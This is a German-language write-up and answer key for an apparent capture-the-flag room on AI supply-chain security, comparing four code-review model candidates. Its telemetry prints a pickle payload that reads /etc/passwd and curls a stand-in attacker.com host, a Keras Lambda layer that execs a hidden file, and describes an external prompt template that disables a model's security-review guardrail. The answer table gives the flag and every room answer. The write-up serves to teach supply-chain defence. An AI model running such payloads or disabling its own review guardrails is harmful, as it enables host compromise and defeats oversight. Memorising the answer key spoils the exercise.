# AI Supply Chain — Checkpoint: Model Gate Evaluation

Analyse der vier Code-Review-Modellkandidaten für TryTrainMe's Produktions-Gate.

## Szenario

TryTrainMe's CISO hat eine strikte Regel: **Kein Modell erreicht Production ohne vollständigen Sandbox-Evaluierungszyklus.** Vier Kandidaten wurden eingereicht und gegen denselben Test-PR evaluiert — ein Change, der Input-Validation von einem Authentication-Endpoint entfernt. Das korrekte Verdict ist "Needs Changes" (Reject).

## Kandidaten-Übersicht

| Kandidat | Datei | Format | Verdict | Empfehlung |
|----------|-------|--------|---------|------------|
| **A** | `code_reviewer_pro.pkl` | Pickle | Approved | **REJECT** |
| **B** | `code_reviewer_lite.safetensors` | SafeTensors | Needs Changes | **APPROVE** |
| **C** | `pr_analyzer_v3.h5` | Keras H5 | Needs Changes | **REJECT** |
| **D** | `api.reviewsvc.io` | Remote API | Approved | **REJECT** |

## Detailanalyse

### Candidate A — `code_reviewer_pro.pkl` — REJECT

**Format:** Pickle (unsicher — erlaubt beliebige Code-Ausführung bei Deserialisierung)

**Telemetrie:**
```
MODEL LOAD BEGIN: /models/code_reviewer_pro.pkl (pickle)
IMPORT DETECTED: module=os [DANGEROUS]
FILE ACCESS: /etc/passwd mode=rb [SUSPICIOUS]
SYSTEM CALL: os.system("curl http://attacker.com/beacon -d session=eval-7f2a9c3b") [CRITICAL]
MODEL LOAD COMPLETE: object_type=int [SUSPICIOUS]
PROMPT TEMPLATE LOAD: source=external (CommunityReview v4.2) [UNVERIFIED]
GUARDRAIL CHECK: security_review_flag=disabled [WARNING]
INFERENCE COMPLETE: verdict=Approved
```

**Supply-Chain-Failures (2, miteinander verbunden):**

1. **Pickle-Deserialisierung mit eingebettetem Exploit:**
   - Importiert `os`-Modul
   - Liest `/etc/passwd` (Host-Reconnaissance)
   - Sendet Beacon an `attacker.com` mit Session-ID `eval-7f2a9c3b`
   - Modell-Objekt ist `int` statt ein ML-Modell — der Pickle enthält nur den Exploit

2. **Unverified External Policy Template:**
   - Nutzt `CommunityReview v4.2` aus einer externen Quelle (nicht verifiziert)
   - Template deaktiviert `security_review_flag`
   - Dadurch wird die Sicherheitsüberprüfung umgangen → falsches Verdict "Approved"

**Verbindung:** Beide Failures stammen vom selben Angreifer. Der Pickle-Payload kontaktiert `attacker.com`, und das externe Template deaktiviert die Guardrails, damit der Backdoor unentdeckt bleibt. Die Session-ID `eval-7f2a9c3b` verknüpft beides — sie taucht sowohl im Beacon als auch im Build-Reference des Templates auf.

**Flag:** `THM{supp1y_ch41n_0wn3d}`
(Abfragbar über den Chatbot: "What is session eval-7f2a9c3b?")

---

### Candidate B — `code_reviewer_lite.safetensors` — APPROVE

**Format:** SafeTensors (sicher — enthält nur Tensor-Daten, keine Code-Ausführung möglich)

**Telemetrie:**
```
FORMAT VALIDATION: safetensors header valid [OK]
MODEL LOAD COMPLETE: object_type=SafeTensors [OK]
PROMPT TEMPLATE LOAD: source=internal (TryTrainMe v1.0) [VERIFIED]
GUARDRAIL CHECK: security_review_flag=enabled [OK]
INFERENCE COMPLETE: verdict=Needs Changes
```

**Warum sicher:**
- SafeTensors-Format: mathematisch garantiert keine Code-Ausführung
- Internes, verifiziertes Prompt-Template (TryTrainMe v1.0)
- Security-Guardrails aktiviert
- Korrektes Verdict: "Needs Changes" — erkennt richtig, dass das Entfernen von Input-Validation gefährlich ist

---

### Candidate C — `pr_analyzer_v3.h5` — REJECT

**Format:** Keras H5 (riskant — kann Lambda-Layers mit beliebigem Python-Code enthalten)

**Telemetrie:**
```
LAMBDA LAYER DETECTED: custom code present [DANGEROUS]
LAMBDA LAYER CODE: exec(open('/tmp/.cache').read()) [SUSPICIOUS]
LAMBDA EXEC: /tmp/.cache read attempt blocked [DANGEROUS]
INFERENCE COMPLETE: verdict=Needs Changes
```

**Problem:**
- Lambda-Layer enthält `exec(open('/tmp/.cache').read())` — liest und führt beliebigen Code aus einer versteckten Datei aus
- Obwohl das Verdict korrekt ist ("Needs Changes"), ist das Modell selbst kompromittiert
- Die Sandbox hat den Exploit blockiert, aber in Production könnte er durchkommen

---

### Candidate D — `api.reviewsvc.io` — REJECT

**Format:** Remote API (keine lokale Kontrolle über Modell oder Prompt-Template)

**Telemetrie:**
```
ENDPOINT CONFIGURED: https://api.reviewsvc.io/v2 [UNVERIFIED]
API METADATA: model_provenance=not_disclosed [WARNING]
API METADATA: compliance_cert=absent [WARNING]
PROMPT TEMPLATE LOAD: source=vendor-managed [UNVERIFIED]
GUARDRAIL CHECK: vendor-managed, not inspectable [UNVERIFIED]
INFERENCE COMPLETE: verdict=Approved
```

**Probleme:**
- Modellherkunft unbekannt (`not_disclosed`)
- Keine Compliance-Zertifizierung
- Prompt-Template wird vom Vendor verwaltet, nicht inspizierbar
- Guardrails nicht überprüfbar
- Falsches Verdict: "Approved" für einen unsicheren Change

---

## Antworten

| # | Frage | Antwort |
|---|-------|---------|
| 1 | Welche Datei hat Candidate A versucht zu lesen? | `/etc/passwd` |
| 2 | Welches Security-Flag ist disabled? | `security_review_flag` |
| 3 | Policy Template von Candidate A? | `CommunityReview v4.2` |
| 4 | Flag (Link zwischen den zwei Failures)? | `THM{supp1y_ch41n_0wn3d}` |
| 5 | Production-Empfehlung für Candidate A? | `Reject` |
| 6 | Welchen Kandidaten genehmigen? | `Candidate B` |

## Gelernte Konzepte

### Sichere vs. unsichere Modellformate

| Format | Risiko | Code-Ausführung? |
|--------|--------|-------------------|
| **SafeTensors** | Niedrig | Nein — nur Tensor-Daten |
| **ONNX** | Niedrig | Nein — Graph-basiert |
| **Pickle (.pkl)** | Hoch | Ja — beliebiger Python-Code bei `pickle.load()` |
| **Keras H5** | Mittel | Möglich über Lambda-Layers |
| **Remote API** | Variabel | Nicht inspizierbar |

### Supply-Chain-Angriffsvektoren (in diesem Szenario)

1. **Pickle Deserialization Attack**: Einschleusen von Schadcode in ein Pickle-Modell
2. **Prompt Template Poisoning**: Externes Template deaktiviert Sicherheits-Guardrails
3. **Lambda Layer Injection**: Versteckter Code in Keras-Modell-Layern
4. **Opaque API Dependency**: Abhängigkeit von einem nicht überprüfbaren externen Dienst

### Verknüpfte Angriffe

Die stärkste Erkenntnis: Ein einzelner Angreifer kann **mehrere Supply-Chain-Vektoren gleichzeitig** kompromittieren. Bei Candidate A hat derselbe Akteur sowohl das Modell (Pickle-Exploit) als auch das Policy-Template (Guardrail-Deaktivierung) kontrolliert — ein koordinierter Angriff, der einzeln betrachtet jeweils "nur" ein Warning wäre, zusammen aber einen vollständigen Sicherheitsbypass darstellt.
